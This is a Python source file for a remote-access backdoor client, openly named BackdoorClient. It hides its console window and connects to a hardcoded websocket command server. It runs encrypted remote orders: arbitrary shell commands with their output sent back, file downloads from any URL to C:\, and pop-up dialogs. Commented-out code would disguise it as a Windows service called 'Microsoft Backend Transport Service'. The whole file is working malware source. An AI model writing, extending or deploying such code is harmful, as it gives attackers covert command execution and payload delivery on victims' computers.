#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import chardet
import ctypes
import subprocess
import threading
import uuid
import json
import time
import urllib
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES

# import win32service
# import win32serviceutil
# import win32event
__author__ = 'nekocode'


class BackdoorClient(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'ws://192.168.10.3:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                self.ws = create_connection(self.SERVER_HOST)

                sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
                self.ws.send(json.dumps(sercret_msg))

                time.sleep(1)

                while True:
                    msg = json.loads(self.decrypt(self.ws.recv()))
                    if 'cmd' in msg:
                        command = msg['cmd']

                        if command == 'dialog':
                            ShowDialog(msg, self)
                        elif command == 'exec_cmd':
                            ExecCmd(msg, self)
                        elif command == 'download':
                            Download(msg, self)

                self.ws.close()

            except Exception as e:
                print e.message
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def send_msg(self, data):
        self.ws.send(self.encrypt(json.dumps({'data': data})))

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


class Download(threading.Thread):
    def __init__(self, msg, client):
        threading.Thread.__init__(self)
        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
        self.client = client

        self.url = msg['url']
        self.filename = msg['filename']

        self.daemon = True
        self.start()

    def run(self):
        try:
            data = urllib.urlopen(self.url).read()
            with open("c:\\" + self.filename, 'wb') as f:
                f.write(data)

            self.msg['rlt'] = 'Downloaded: ' + self.filename
            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))

        except Exception as e:
            self.msg['rlt'] = 'ERROR: ' + e.message
            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))


class ExecCmd(threading.Thread):
    def __init__(self, msg, client):
        threading.Thread.__init__(self)
        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
        self.client = client

        self.command = b64decode(msg['cmd_to_exec'])

        self.daemon = True
        self.start()

    def run(self):
        try:
            proc = subprocess.Popen(self.command, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read()
            stdout_value += proc.stderr.read()

            self.msg['rlt'] = decode2utf(stdout_value)
            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))

        except Exception as e:
            self.msg['rlt'] = 'ERROR: ' + e.message
            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))


class ShowDialog(threading.Thread):
    def __init__(self, msg, client):
        threading.Thread.__init__(self)
        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
        self.client = client

        self.content = decode2utf(b64decode(msg['content']))
        self.title = None if not msg['title'] else decode2utf(b64decode(msg['title']))
        if not self.title:
            self.title = u''

        self.daemon = True
        self.start()

    def run(self):
        # win32api.MessageBox(0, self.content, self.title)
        ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
        self.msg['rlt'] = 'Show dialog OK.'
        self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))


# class BackendDaemonSrv(win32serviceutil.ServiceFramework):
#     _svc_name_ = 'TransSrv'
#     _svc_display_name_ = 'Microsoft Backend Transport Service'
#     _svc_description_ = 'Enables you to access your pc anytime, anywhere.'
#
#     def __init__(self, args):
#         win32serviceutil.ServiceFramework.__init__(self, args)
#         self.stop_event = win32event.CreateEvent(None, 0, 0, None)
#
#     def SvcDoRun(self):
#         self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
#         try:
#             self.ReportServiceStatus(win32service.SERVICE_RUNNING)
#             self.start()
#             win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
#         except Exception, x:
#             self.SvcStop()
#
#     def SvcStop(self):
#         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#         win32event.SetEvent(self.stop_event)
#         self.ReportServiceStatus(win32service.SERVICE_STOPPED)
#
#     def start(self):
#         self.runflag = True
#         os.popen('cmd.exe')
#
#     def my_stop(self):
#         self.runflag = False


def module_path():
    encoding = sys.getfilesystemencoding()
    if hasattr(sys, 'frozen'):
        return os.path.dirname(unicode(sys.executable, encoding))
    return os.path.dirname(unicode(__file__, encoding))


def decode2utf(rawstr):
    if chardet.detect(rawstr)['encoding'] != 'ascii':
        return rawstr.decode('gbk')
    else:
        return rawstr.decode('ascii')


def hostname():
    sys_name = os.name

    if sys_name == 'nt':
        return os.getenv('computername')
    elif sys_name == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unknow hostname'


def hide_cmd_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)


if __name__ == '__main__':
    # if len(sys.argv) == 1:
    hide_cmd_window()
    BackdoorClient()
    while True:
        time.sleep(10)
    # else:
    #     win32serviceutil.HandleCommandLine(BackendDaemonSrv)

